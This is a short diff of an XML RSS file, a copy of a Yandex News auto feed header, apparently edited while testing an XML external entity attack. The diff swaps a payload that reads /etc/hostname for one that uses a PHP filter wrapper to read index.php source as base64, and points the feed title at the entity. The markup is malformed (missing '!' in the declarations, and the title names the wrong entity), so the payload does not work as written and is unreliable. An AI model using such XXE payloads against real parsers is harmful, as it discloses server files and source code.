@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8" ?>
 <DOCTYPE foo [
 <!ELEMENT foo ANY >
-<ENTITY xxe SYSTEM "file:///etc/hostname" >
+<ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
 ]>
 <rss version="2.0">
 <channel>
-<title>&foo;</title>
+<title>АВТО&foo;</title>
 <link>https://news.yandex.ru/auto.html?from=rss</link>
 <description>Первая в России служба автоматической обработки и систематизации новостей. Сообщения ведущих российских и мировых СМИ. Обновление в режиме реального времени 24 часа в сутки.</description>
 <image>
